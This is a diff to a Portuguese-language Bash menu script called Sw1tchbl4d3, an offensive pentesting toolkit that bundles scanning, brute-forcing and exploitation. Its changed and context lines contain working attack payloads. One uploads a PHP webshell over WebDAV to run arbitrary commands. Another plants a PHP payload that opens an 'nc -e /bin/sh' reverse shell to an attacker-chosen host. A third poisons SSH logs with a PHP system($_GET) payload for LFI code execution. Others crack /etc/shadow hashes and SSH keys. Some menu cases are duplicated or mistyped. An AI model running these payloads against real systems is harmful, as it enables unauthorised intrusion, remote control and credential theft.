@@ -30,8 +30,8 @@ do
     # Imprimindo as opções do menu
     echo
     echo "Inf Gathering # Enumeração # Scan # Exploração"
-    echo -e "\e[33;1mDesenvolvido por: Pentest Jr # Carlos Tuma # Bl4dsc4n\e[0m" 
-    echo -e "\e[31;1mLivre uso e modificação, mantenha o crédito em comentário\e[0m" "\e[32;1;5mSw1tchbl4d3 Ver 1.0.2a\e[0m"           
+    echo -e "\e[36;1mDesenvolvido por: Pentest Jr # Carlos Tuma # Bl4dsc4n\e[0m" 
+    echo -e "\e[31;1mLivre uso e modificação, mantenha o crédito em comentário\e[0m" "\e[32;1;5mSw1tchbl4d3 Ver 1.0.3a\e[0m"           
     echo "----------------------------------------------------------------------------------------------------"
     echo '| 1 - Scan Serviços & Vuln Nmap 11- Brute Force de SubDomain    21- Criando Reverse Shell MSFvenom  |'
     echo '| 2 - Scan Arquivos Gobuster    12- Baixar arquivos do ftp      22- Dirsearch                       |'
@@ -78,7 +78,7 @@ do
 	    "1") # Scan Discovery ou Personalizado	
 			echo "Digite o IP alvo:"
             		read ip
-	    		echo "Digite as Opcoes do Scan ou Enter"
+	    		echo "Digite as Opcoes do Scan ou Enter (Ex: -sS -sV -sC -A --script=vuln -p-)"
             		read opnmap
             		if [ "$opnmap" == "" ]
 	    		then
@@ -458,6 +458,8 @@ do
 	    echo "5) Decode de arquivo em base64"
             echo "6) Converter Hex para Caractere"
             echo "7) Converter Decimal"
+            echo "8) Base64 Decode de texto"
+            echo "9) Converter texto em base64"
 
             read -n1 -p 'Opção: ' resp3
             echo
@@ -499,7 +501,18 @@ do
 	    "7")  # 
             		 echo "Digite o caractera o Decimal para conveter:"
             		 read Decimal
-			 printf "%x\n" $Decimal            
+			 printf "%x\n" $Decimal
+			 
+	    ;;
+	    "7")  # 
+            		 echo "Digite o texto codificado para decode:"
+            		 read texto
+			 echo "$texto" | base64 -d
+            ;;
+	    "8")  # 
+            		 echo "Digite o texto para converter:"
+            		 read texto
+			 echo "$texto" | base64			              
 	    esac
 	    ;;
 
@@ -723,16 +736,16 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                         python3 $dirb -u $ip --wordlist=$arquivosbrute -f -e $opgobuster1 
+		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute 
 		                   else
-		                         python3 $dirb -u $ip --wordlist=$arquivosbrute -f -e $opgobuster1 -x $status
+		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute -x $status
 		                   fi
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-                                         python3 $dirb -u $ip --wordlist=$wordlista3 -f -e $opgobuster1
+                                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3 
 		                   else
-     		                         python3 $dirb -u $ip --wordlist=$wordlista3 -f -e $opgobuster1 -x $status     
+     		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3  -x $status     
 		                   fi
 		                        
 		             fi      
@@ -741,16 +754,16 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb -u $ip --wordlist=$arquivosbrute -f -e $opgobuster 
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute  
 		                   else
-		                        python3 $dirb -u $ip --wordlist=$arquivosbrute -f -e $opgobuster -x $status
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute -x $status
 		                   fi
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb -u $ip --wordlist=$arquivosbrute -f -e $opgobuster 
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute  
 		                   else
-		                        python3 $dirb -u $ip --wordlist=$wordlista3 -f -e $opgobuster -x $status
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $wordlista3 -x $status
 		                   fi     
 		             fi    
                        fi
@@ -773,16 +786,16 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb --recursive -u $ip --wordlist=$arquivosbrute -f -e $opgobuster1 
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 
 		                   else
-		                        python3 $dirb --recursive -u $ip --wordlist=$arquivosbrute -f -e $opgobuster1 -x $status
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 -x $status
 		                   fi
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-  	                                python3 $dirb --recursive -u $ip --wordlist=$wordlista3 -f -e $opgobuster1 
+  	                                python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 
   	                           else
-		                        python3 $dirb --recursive -u $ip --wordlist=$wordlista3 -f -e $opgobuster1 -x $status
+		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 -x $status
 		                   fi     
 		             fi      
 	               else
@@ -790,21 +803,21 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb --recursive -u $ip --wordlist=$arquivosbrute -f -e $opgobuster 
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster 
 		                   else
-		                        python3 $dirb --recursive -u $ip --wordlist=$arquivosbrute -f -e $opgobuster -x $status
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster -x $status
 		                   fi     
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb --recursive -u $ip --wordlist=$wordlista3 -f -e $opgobuster 
+		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster 
 		                   else
-		                        python3 $dirb --recursive -u $ip --wordlist=$wordlista3 -f -e $opgobuster -x $status
+		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster -x $status
 		                   fi     
 		             fi    
-                      fi 
-         esac	    
-         ;; 
+                       fi 
+            esac	    
+            ;; 
 
 ##############################################################################################################
 	 23)  # PortScan
@@ -827,13 +840,15 @@ do
             read ip
             echo "Digite o Metodo HTTP ex: OPTIONS"
             read metodo
-            curl -v -X $metodo $ip 	
+            curl -X $metodo http://$ip 	
             ;;
 
 ######################################### WEBDAV ##################################################################
 	25)  # Injetando webshell.php WEBDAV 
             echo "1) Executar comandos do sistema webshell.php WEBDAV"
 	    echo "2) Shell Reverse com nc"
+	    echo "3) Teste automatizado Davtest"
+	    echo "4) Conectar webdav - cadaver"
           	  
             read -n1 -p 'Opção: ' resp5
             echo
@@ -847,7 +862,7 @@ do
              	      read comando
 		      echo
                       curl -X PUT -d "<?php system('$comando');?>" $ip/webshell.php
-                      curl -X GET $ip/webshell.php
+                      curl -s -X GET $ip/webshell.php | egrep -v "<"
             ;;
 
             "2") # Injetando webshell.php WEBDAV  
@@ -860,9 +875,26 @@ do
                       echo "Digite a Porta Reversa"
                       read porta
                       echo
-                      curl -X PUT -d "<?php system('nc -e /bin/sh $ipreverso $porta');?>" $ip/webshell.php
-                      curl -X GET $ip/webshell.php
-            		           
+                      curl -s -X PUT -d "<?php system('nc -e /bin/sh $ipreverso $porta');?>" http://$ip/webshell.php
+                      curl -s -X GET http://$ip/webshell.php
+                     # curl -v http://172.16.1.10/webdav/ --upload-file shell.php   
+            ;;
+            
+            "3") # Testar WebDav - davtest  
+            		 
+                      echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
+                      read ip
+                      davtest --url http://$ip/
+            ;;         
+                     
+            "4") # Conectar no WEBDAV - Cadaver  
+            		 
+                      echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
+                      read ip
+                      cadaver http://$ip/
+              
+                     
+                            
             esac
 	    ;;
 
@@ -904,8 +936,9 @@ do
 	    echo "2) Brute SSH Hydra"
             echo "3) Brute Hash - hashCat"
 	    echo "4) Brute Hydra Protocolos"
-            echo "5) Brute de Hash Linux"
+            echo "5) Brute de Hash Linux etc/shadow"
 	    echo "6) Brute id_rsa SSH"
+	    echo "7) Brute de Hash Linux"
           
             read -n1 -p 'Opção: ' resp6
             echo
@@ -921,8 +954,10 @@ do
                     if [ "$wordlista2" == "" ]
 	            then
 		         john --format=$formato --wordlist=$wordlista $hash
+		         john $hash --show
 	            else
 		         john --format=$formato --wordlist=$wordlista2 $hash
+		         john $hash --show
                     fi
            ;;
 
@@ -988,7 +1023,7 @@ do
 
            ;;
  
-           "5") # Brute de Hash Linux  
+           "5") # Brute de Hash Linux etc/shadow  
             	    echo "Digite o caminho do Passwd"
                     read passwd2
                     echo "Digite o caminho do Shadow"
@@ -1015,10 +1050,26 @@ do
                     /usr/share/john/ssh2john.py $id_rsa > id_rsa.txt
                     if [ "$wordlista5" == "" ]
 	  	    then
-         	          john id_rsa.txt --wordlist=$wordlista 	
+         	          john id_rsa.txt --wordlist=$wordlista
+         	          john id_rsa.txt --show 	
 	    	    else
                           john id_rsa.txt --wordlist=$wordlista5 
+                          john id_rsa.txt --show
             	    fi
+          ;;               
+          "7") # Brute HASH linux 
+            	    echo "Digite o caminho do HASH ex: /home/user/hash.tx"
+                    read  hash2
+                    echo "Digite o Caminho da Wordlist ou Enter"
+                    read wordlista5
+                    if [ "$wordlista5" == "" ]
+	  	    then
+         	          john $hash2 --wordlist=$wordlista
+         	          john $hash2 --show 	
+	    	    else
+                          john $hash2 --wordlist=$wordlista5 
+                          john $hash2 --show
+            	    fi               
                          
           esac
 	  ;;
@@ -1028,7 +1079,7 @@ do
        28)  # Infecção de Log SSH - LFI linux 
            echo "1) Infectando Log SSH - LFI"
            echo "2) Explorando Infec Log SSH - LFI"
-           
+                   
            read -n1 -p 'Opção: ' resp12
            echo
 	   case $resp12 in
@@ -1039,7 +1090,8 @@ do
                     echo "Aguarde..erre a senha 3 vezes.."
                     echo teste |  ssh '<?php system($_GET["sw1tchbl4d3"]); ?>'@$ip
 	   ;;
-
+	   
+	   
 	   "2") # Explorando Infec Log SSH - LFI
 
 		    echo "Digite o local com LFI ex: domino/arquivo.php?="
@@ -1052,8 +1104,7 @@ do
 		    echo "Comando executado..."
                     echo "-----------------------------------------------------------" 
                     echo "$resposta" 
-
-           
+                     
            esac
            ;;
 
@@ -1120,7 +1171,7 @@ do
             "3") # Gerando Letras Minúsculas , Maiúsculas e Números
             	    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
                     read quantidadecara
-                    echo "Digite l=minuscula u=maiúscula ex: u"
+                    echo "Digite l=minuscula u=maiúscula ex: u"2
                     read mm
 		    echo "Digite um nome para o Arquivo"
                     read nomearquivo
